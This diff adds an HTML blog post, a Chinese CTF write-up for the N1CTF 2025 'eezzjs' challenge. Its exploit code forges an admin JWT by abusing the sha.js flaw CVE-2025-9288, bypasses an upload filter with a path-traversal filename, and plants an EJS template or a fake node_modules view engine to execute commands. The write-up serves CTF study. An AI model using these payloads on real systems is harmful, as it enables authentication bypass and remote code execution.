@@ -1,0 +1,671 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/onehang.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="onehang">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言n1的题目真难，又刷新了对自己的定位，最简单的一题考的js，但是对js不是很熟悉 eezzjs这题有两个点  首先是登录，因为没有注册功能，只有一个admin用户，所以只能想办法得到一个合法的token来进行登录 登录成功之后可以进行文件上传，但要求不能包含字符串’js’  不难注意到 12345678910111213function serveIndex(req, res) &#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="n1ct2025-wp">
+<meta property="og:url" content="http://example.com/2025/11/17/n1ctf2025-wp/index.html">
+<meta property="og:site_name" content="onehang&#39;s blogs">
+<meta property="og:description" content="前言n1的题目真难，又刷新了对自己的定位，最简单的一题考的js，但是对js不是很熟悉 eezzjs这题有两个点  首先是登录，因为没有注册功能，只有一个admin用户，所以只能想办法得到一个合法的token来进行登录 登录成功之后可以进行文件上传，但要求不能包含字符串’js’  不难注意到 12345678910111213function serveIndex(req, res) &#123;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/11/17/n1ctf2025-wp/image-20251117183312766.png">
+<meta property="article:published_time" content="2025-11-17T01:58:42.000Z">
+<meta property="article:modified_time" content="2025-11-17T13:34:33.486Z">
+<meta property="article:author" content="onehang">
+<meta property="article:tag" content="-wp -复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/11/17/n1ctf2025-wp/image-20251117183312766.png">
+  
+  
+  
+  <title>n1ct2025-wp - onehang&#39;s blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>onehang</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="n1ct2025-wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-17 09:58" pubdate>
+          2025年11月17日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">n1ct2025-wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="/2025/11/17/n1ctf2025-wp/#前言" class="headerlink" title="前言"></a>前言</h1><p>n1的题目真难，又刷新了对自己的定位，最简单的一题考的js，但是对js不是很熟悉</p>
+<h1 id="eezzjs"><a href="/2025/11/17/n1ctf2025-wp/#eezzjs" class="headerlink" title="eezzjs"></a>eezzjs</h1><p>这题有两个点</p>
+<ul>
+<li>首先是登录，因为没有注册功能，只有一个admin用户，所以只能想办法得到一个合法的token来进行登录</li>
+<li>登录成功之后可以进行文件上传，但要求不能包含字符串’js’</li>
+</ul>
+<p>不难注意到</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">serveIndex</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> templ = req.<span class="hljs-property">query</span>.<span class="hljs-property">templ</span> || <span class="hljs-string">&#x27;index&#x27;</span>;<br>    <span class="hljs-keyword">var</span> lsPath = path.<span class="hljs-title function_">join</span>(__dirname, req.<span class="hljs-property">path</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        res.<span class="hljs-title function_">render</span>(templ, &#123;<br>            <span class="hljs-attr">filenames</span>: fs.<span class="hljs-title function_">readdirSync</span>(lsPath),<br>            <span class="hljs-attr">path</span>: req.<span class="hljs-property">path</span><br>        &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error rendering page&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以指定文件进行渲染，如果我们能上传一个.ejs文件，就可以实现rce了</p>
+<p>关键是如何伪造出合法的token</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">signJWT</span> = (<span class="hljs-params">payload, &#123; expiresIn &#125; = &#123;&#125;, secret = JWT_SECRET</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> header = &#123; <span class="hljs-attr">alg</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>, <span class="hljs-attr">typ</span>: <span class="hljs-string">&#x27;JWT&#x27;</span> &#125;;<br>    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() / <span class="hljs-number">1000</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(payload)<br>    <span class="hljs-keyword">const</span> body = &#123; ...payload, <span class="hljs-attr">length</span>:payload.<span class="hljs-property">username</span>.<span class="hljs-property">length</span>,<span class="hljs-attr">iat</span>: now &#125;;<br>    <span class="hljs-keyword">if</span> (expiresIn) &#123;<br>        body.<span class="hljs-property">exp</span> = now + expiresIn;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> [<br>        <span class="hljs-title function_">toBase64Url</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header)),<br>        <span class="hljs-title function_">toBase64Url</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(body)),<br>        <span class="hljs-title function_">sha256</span>(...[<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header), body, secret])<br>    ].<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>签名的时候用的密钥是随机数，我们没办法获得，所以一直想不到如何伪造这个token</p>
+<p>赛后看wp发现，如果debug一下，执行npm install 就会发现使用的sha.js版本是有cve的</p>
+<p>[<a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-95m3-7q98-8xr5">CVE-2025-9288</a>]</p>
+<p><img src="/2025/11/17/n1ctf2025-wp/image-20251117183312766.png" srcset="/img/loading.gif" lazyload alt="image-20251117183312766"></p>
+<p>一个简单的payload就可以很直观的理解这个漏洞</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt; <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sha.js&#x27;</span>)(<span class="hljs-string">&#x27;sha256&#x27;</span>)<span class="hljs-selector-class">.update</span>(<span class="hljs-string">&#x27;foo&#x27;</span>)<span class="hljs-selector-class">.digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-string">&#x27;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae&#x27;</span><br>&gt; <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sha.js&#x27;</span>)(<span class="hljs-string">&#x27;sha256&#x27;</span>)<span class="hljs-selector-class">.update</span>(<span class="hljs-string">&#x27;fooabc&#x27;</span>)<span class="hljs-selector-class">.update</span>(&#123;length:-<span class="hljs-number">3</span>&#125;)<span class="hljs-selector-class">.digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-string">&#x27;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>也就是如果我们传给update的参数是一个对象，他就会尝试将他转换成buffer，此时可以利用<code>length:</code>来控制被哈希的字符串的长度</p>
+<p>如果我们控制length使得被hash的内容长度变成零，那么在密钥长度相同的情况下，得到的哈希值是相同的，于是就得到了我们的payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sha = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sha.js&#x27;</span>)<br><span class="hljs-keyword">const</span> &#123;verifyJWT&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./auth&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">sha256</span> = (<span class="hljs-params">...messages</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> hash = <span class="hljs-title function_">sha</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>)<br>    messages.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;[DEBUG] m =&#x27;</span>, m); hash.<span class="hljs-title function_">update</span>(m)&#125;)<br>    <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>&#125;;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">toBase64Url</span> = (<span class="hljs-params">input</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> buffer = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">isBuffer</span>(input) ? input : <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(input);<br>    <span class="hljs-keyword">return</span> buffer<br>        .<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>)<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\+/g</span>, <span class="hljs-string">&#x27;-&#x27;</span>)<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;_&#x27;</span>)<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/=+$/</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;;<br><span class="hljs-keyword">const</span> header = &#123;<br>    <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>    <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;;<br><span class="hljs-keyword">const</span> len=-(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header).<span class="hljs-property">length</span>+<span class="hljs-number">18</span>);   <span class="hljs-comment">// username: &#x27;admin&#x27;   </span><br><span class="hljs-keyword">var</span> payload = &#123;<span class="hljs-attr">username</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-attr">length</span>:len&#125;;<br><span class="hljs-keyword">const</span> secret = <span class="hljs-string">&#x27;q&#x27;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">18</span>);<span class="hljs-comment">//被哈希的内容为空时，哈希值只和密钥长度有关</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">sha256</span>(...[<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header), payload, secret]));<br><span class="hljs-keyword">const</span> body = <span class="hljs-string">&#x27;&#123;&quot;length&quot;:-45,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span>;<br>token = [<br>        <span class="hljs-title function_">toBase64Url</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header)),<br>        <span class="hljs-title function_">toBase64Url</span>(body),<br>        <span class="hljs-title function_">sha256</span>(...[<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header), payload, secret])<br>    ].<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">verifyJWT</span>(token,secret));<br></code></pre></td></tr></table></figure>
+
+<p>运行得到token</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">token</span><span class="hljs-operator">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZW5ndGgiOi00NSwidXNlcm5hbWUiOiJhZG1pbiJ9.<span class="hljs-number">674</span>dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1<br></code></pre></td></tr></table></figure>
+
+<p>现在登录的问题解决了，我们要想办法实现rce</p>
+<p>waf</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> &#123;filedata,filename&#125;=req.<span class="hljs-property">body</span>;<br><span class="hljs-keyword">var</span> ext = path.<span class="hljs-title function_">extname</span>(filename).<span class="hljs-title function_">toLowerCase</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/js/i</span>.<span class="hljs-title function_">test</span>(ext)) &#123;<br>    <span class="hljs-keyword">return</span>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Denied filename&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">var</span> filepath = path.<span class="hljs-title function_">join</span>(uploadDir,filename);<br></code></pre></td></tr></table></figure>
+
+<p>可以用..来绕过     filename &#x3D; ..&#x2F;..&#x2F;app&#x2F;views&#x2F;exploit.ejs&#x2F;a&#x2F;..</p>
+<p>这样后缀名就为空，不会触发waf，同时文件也能上传到正确的位置,借用一下佬的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">ssti_payload = <span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;%</span><br><span class="hljs-string">  const cp = (Function(&#x27;return process&#x27;))().mainModule.require(&#x27;child_process&#x27;);</span><br><span class="hljs-string">  const data = cp.execSync(&#x27;cat /ffffffflag&#x27;, &#x27;utf8&#x27;);</span><br><span class="hljs-string">%&gt;</span><br><span class="hljs-string">&lt;pre&gt;&lt;%= data %&gt;&lt;/pre&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>r = c.post(<br>    <span class="hljs-string">&quot;/upload&quot;</span>,<br>    json=<span class="hljs-built_in">dict</span>(<br>        filename=<span class="hljs-string">&quot;../../app/views/exploit.ejs/a/..&quot;</span>,<br>        filedata=base64.b64encode(ssti_payload).decode(),<br>    ),<br>)<br></code></pre></td></tr></table></figure>
+
+<p>最后再&#x2F;?templ&#x3D;exploit.ejs    就可以实现任意代码执行</p>
+<p>但这并不是这题的预期解，nodejs的文档中有一个<a target="_blank" rel="noopener" href="https://nodejs.org/api/modules.html#requireid">说明</a></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If <span class="hljs-keyword">the</span> exact filename is <span class="hljs-keyword">not</span> found, <span class="hljs-keyword">then</span> Node.js will attempt <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> <span class="hljs-keyword">the</span> required filename <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> added extensions: .js, .json, <span class="hljs-keyword">and</span> <span class="hljs-keyword">finally</span> .node. When loading <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> that has <span class="hljs-keyword">a</span> different <span class="hljs-built_in">extension</span> (e.g. .cjs), its full name must be passed <span class="hljs-built_in">to</span> <span class="hljs-built_in">require</span>(), including its <span class="hljs-built_in">file</span> <span class="hljs-built_in">extension</span> (e.g. <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./file.cjs&#x27;</span>)).<br></code></pre></td></tr></table></figure>
+
+<p>也就是require一个文件的时候这个文件没找到，那么他就会尝试给他换不同的后缀名（js，json，node）</p>
+<p>我们这里就可以上传.node文件来实现rce</p>
+<p>discord上还有一个佬的做法是，上传一个pwned文件到&#x2F;app&#x2F;node_modules&#x2F;pwned</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&#123;<span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;../node_modules/pwned&quot;</span>,<span class="hljs-string">&quot;filedata&quot;</span>:<span class="hljs-string">&quot;ZnVuY3Rpb24gX19leHByZXNzKCkgewogICAgY29uc29sZS5sb2coJ3B3bmVkYicpOwp9Cgptb2R1bGUuZXhwb3J0cyA9IHsgX19leHByZXNzIH07&quot;</span>&#125;<br><br><span class="hljs-built_in">decode</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">__express</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;pwnedb&#x27;</span>);<br>&#125;<br><br>module.exports = &#123; __express &#125;;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>因为它存放在 <code>node_modules</code> 目录下，任何 <code>require(&#39;pwned&#39;)</code> 调用都会加载这个文件。</li>
+<li>它导出了一个名为 <code>__express</code> 的函数。在 Express 生态中，一个模块如果导出了 <code>__express</code> 函数，就意味着它可以作为一个视图引擎被 Express 加载和使用。</li>
+</ul>
+<p>这时再上传一个任意的1.pwned文件，随后使用?templ&#x3D;1.pwned进行渲染，此时Express不知道如何处理.pwned文件，于是它会尝试加载一个名为 <code>pwned</code> 的视图引擎模块。它的查找逻辑是：<code>require(&#39;pwned&#39;)</code>。因此就调用了我们的__express函数，这样就可以执行任意代码了</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp-%E5%A4%8D%E7%8E%B0/" class="print-no-link">#-wp -复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>n1ct2025-wp</div>
+      <div>http://example.com/2025/11/17/n1ctf2025-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>onehang</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/09/infobahnctf2025-wp/" title="infobahnctf2025-wp">
+                        <span class="hidden-mobile">infobahnctf2025-wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
